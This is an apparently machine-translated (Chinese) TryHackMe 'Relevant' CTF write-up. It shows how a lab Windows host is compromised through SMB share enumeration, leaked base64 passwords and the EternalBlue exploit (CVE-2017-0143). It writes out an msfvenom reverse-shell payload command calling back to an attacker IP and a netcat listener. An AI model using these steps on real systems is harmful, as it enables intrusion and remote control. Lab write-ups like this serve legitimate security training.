<html>
<head>
<title>TryHackMe — Relevant CTF Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe —相关的CTF报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd?source=collection_archive---------0-----------------------#2021-01-02">https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd?source=collection_archive---------0-----------------------#2021-01-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/4494acd1f6eaf3ca4abaf4d8bf638dc0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GrlKy6WjPt_K7IoCxLDl5w.png"/></div></div></figure><p id="b138" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">相关是来自TryHackMe的中等挑战。有一些方法来完善这台机器，但在这篇文章中，我将解释如何使用与samba服务器相关的已知漏洞来完成。</p></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="52d6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，让我们从Nmap开始扫描所有端口。在这里，我们只需要运行:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="f00f" class="lm ln iq li b gy lo lp l lq lr">nmap -oA nmap-full -Pn -sS -T4 -p- --defeat-rst-ratelimit 10.10.61.45</span></pre><p id="8f27" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我已经设置了选项<code class="fe ls lt lu li b">-T4</code>和<code class="fe ls lt lu li b">--defeat-rst-ratelimit</code>来加快扫描速度，因为我在一个带NAT的虚拟机上运行Kali，但这不是必须的。</p><p id="af59" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如你在下面看到的，这台机器有一堆开放的端口。有趣的是，我们注意到有一个HTTP服务器运行在端口80上，看起来像是一个samba服务器。还有一些其他更开放的端口，但是我不需要使用它们中的任何一个来获得root，所以让我们跳过它们。</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lv"><img src="../Images/4f67a1610190b54793c7f84e7f0fdd59.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YCCojqWWnr3PpTz98oVgjw.png"/></div></div></figure><p id="f89a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">访问web服务器时，我们可以看到一个Microsoft IIS默认页面:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lw"><img src="../Images/7cef06e2e158c92d8ba9d096b1aba7c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4ANxmxR_UapDlmhSu769LQ.png"/></div></div></figure><p id="8327" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我已经尝试用<em class="lx"> gobuster </em>枚举子目录，但什么也没找到，所以我们继续吧…</p><p id="b8bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来，让我们看看我们能从samba服务器得到什么。使用<em class="lx"> smbclient </em>，我们只需运行以下命令来尝试枚举共享，并将密码字段留空:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="107f" class="lm ln iq li b gy lo lp l lq lr">smbclient -L \\10.10.61.45\</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/2c742686d165e34306ebbabe003657a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*88eeAlOK9jvciJ2GYv6VSQ.png"/></div></figure><p id="c720" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">很好，我们成功了！有一些默认共享，但nt 4 works SV可能隐藏了一些有趣的东西。我们可以尝试连接到这个共享，并通过运行以下命令来看看我们能得到什么:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="c6d0" class="lm ln iq li b gy lo lp l lq lr">smbclient \\10.10.61.45\nt4wrksv</span></pre><p id="8dfc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如下图所示，有一个名为<em class="lx"> passwords.txt </em>的文件:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/caca377ae536ad56df5f2251a916adfd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DvSNnHW3182DjBdd-0SuEQ.png"/></div></div></figure><p id="22e9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">检查文件后，我们可以看到有两个base64编码的字符串:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/74f2d47e5f88efe54753024690fe14c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*SWgK7B3bnCaPdAnmpf8Yew.png"/></div></figure><p id="60ba" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">通过解码这些字符串，我们似乎可以找到两个用户Bill和Bob的密码:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/b9486a32658bd997698d6373c8edf491.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*WRVNvpd374SYkfnj7bcssg.png"/></div></figure><p id="ae6c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">不错！我们得到了用户的凭证，但是现在呢？让我们再次使用Nmap来运行一些漏洞检查，这样我们就可以看到是否有任何易受攻击的服务器。我们可以使用<code class="fe ls lt lu li b">--script</code>参数来做到这一点:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="e158" class="lm ln iq li b gy lo lp l lq lr">nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.61.45</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mc"><img src="../Images/e6bef1274597b13a17879714809ec6ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KfxsI-ejjW9GTnAVxp40og.png"/></div></div></figure><p id="d200" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Nmap检测到，由于CVE-2017–0143，samba服务器可能易受RCE攻击。快速搜索发现它与永恒之蓝漏洞有关:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi md"><img src="../Images/9ac4f3174025e375e9dcdd3f102d5e0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Av5Q_pPOrnIEQh_ObSk3dg.png"/></div></div></figure><p id="a75a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因此，使用<em class="lx"> searchsploit </em>我们可以获得永久蓝色漏洞:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/42cdc7d4c1f8649b4a5e241e81c7ff38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OEM_wZCXi3huR6Bn8ZTJGw.png"/></div></div></figure><p id="75db" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们使用第二个— windows/remote/42315.py:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="021f" class="lm ln iq li b gy lo lp l lq lr">searchsploit -m windows/remote/42315.py</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/603b98086ef71600c36d8c62ec037fbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H0199c0vA5dZgjCLFyThzw.png"/></div></div></figure><p id="677b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了运行这个漏洞，我们需要下载<em class="lx"> mysmb.py </em>文件，正如脚本开头提到的。此外，我们可以为用户设置用户名和密码。</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/997d7764e7d2994d32ed11cae9f18c6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T2-DDgCk7-GbO8BoNWdnrg.png"/></div></div></figure><p id="0099" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们使用之前获得的凭据。这里我使用Bob的凭证，因为Bill的无效:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/a716f04319e0a49bad1955f59d0e8727.png" data-original-src="https://miro.medium.com/v2/resize:fit:618/format:webp/1*89HN7K3BNk7tgnk1NmG23w.png"/></div></figure><p id="b982" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">通过阅读源代码，可以注意到<code class="fe ls lt lu li b">smb_pwn</code>函数创建了一个虚拟文件pwned.txt来测试漏洞。</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/2e32eae18caa139983e94d4b08b14c0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*DhOjSajbu3RaLnbMxWY2dg.png"/></div></figure><p id="dd45" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">所以我们可以修改它来上传和执行一个反向shell:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/357c606d832c3fc6fae96cf142e217ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*6NfZjpzsfkl5_onB5bI8zA.png"/></div></div></figure><p id="a2ed" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们的rshell.exe可以用<em class="lx"> msfvenom </em>获得。让我们通过运行以下命令来搜索Windows反向shell负载:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="41c0" class="lm ln iq li b gy lo lp l lq lr">msfvenom -l payloads | grep windows | grep reverse | grep shell</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/5cf730e800ab8005fdd6c1ee761f3f2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y2BEB152K2ZstUNyPHDUlg.png"/></div></div></figure><p id="4ca3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">选择<em class="lx">windows/shell _ reverse _ TCP</em>后，我们可以通过运行以下命令来查看参数:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="fc97" class="lm ln iq li b gy lo lp l lq lr">msfvenom -p windows/shell_reverse_tcp --list-options</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/bfd8d1d6f246389493f94e5b3d7fa0c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GMJM6fzhErqXAbnwCtMa4Q.png"/></div></div></figure><p id="9460" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们需要用本地机器IP设置LHOST变量。我选择了4444本地端口值(l port ),但是您可以选择任何其他值。格式将是。因为它将在windows计算机上执行。所以完整的命令是:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="0eb9" class="lm ln iq li b gy lo lp l lq lr">msfvenom -p windows/shell_reverse_tcp LHOST=10.13.6.126 LPORT=4444 -f exe &gt; rshell.exe</span></pre><figure class="ld le lf lg gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/ae79d55ee12408fc7488bf4a51a53e5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i0tljYPdpr7JG8aJdDyIQA.png"/></div></div></figure><p id="b6ad" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在运行脚本之前，我们需要启动本地服务器。使用<em class="lx"> netcat </em>，只需输入:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="df00" class="lm ln iq li b gy lo lp l lq lr">nc -lnvp 4444</span></pre><p id="8f93" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在使用远程机器IP运行脚本，您将获得以下输出:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/2ba7bc4313e8257c5c2a6a49a491933e.png" data-original-src="https://miro.medium.com/v2/resize:fit:970/format:webp/1*xRBtSh7bhbJ1g7ZGy0_m-w.png"/></div></figure><p id="6371" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">尽管显示了一些错误，但总体任务执行成功，为我们提供了一个带有特权用户的shell:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/fbf3c8f72fa1cc427314e545e0be40ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1114/format:webp/1*8dFf3q3rAma0EjR30Q74gA.png"/></div></figure><p id="6e42" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我们需要搜索标志，一个好的起点是Users文件夹，它包含两个用户，Bob和Administrator:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/d4025a1bf290033ebd9d0a614030ef00.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/format:webp/1*-tLhFQVR46acERoaTa6pCg.png"/></div></figure><p id="fbb8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">用户标志可以在Bob目录下的桌面文件夹中找到:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/9377cf9c1451ab12eb2d34e8c996b75e.png" data-original-src="https://miro.medium.com/v2/resize:fit:904/format:webp/1*X4Ud8yo7jLKRQ-ERSfW0qA.png"/></div></figure><p id="8524" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">根标志位于管理员目录下的桌面文件夹中:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/528fb3c7cd54ae5c4108f2baf35af5c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:908/format:webp/1*5yGSiKl6mXLHXsKjONxjIQ.png"/></div></figure></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><h1 id="de6a" class="ms ln iq bd mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no bi translated">参考</h1><ul class=""><li id="46eb" class="np nq iq ka b kb nr kf ns kj nt kn nu kr nv kv nw nx ny nz bi translated"><a class="ae oa" href="https://redteamzone.com/EternalBlue/" rel="noopener ugc nofollow" target="_blank">红队区——永恒之蓝</a></li></ul></div></div>    
</body>
</html>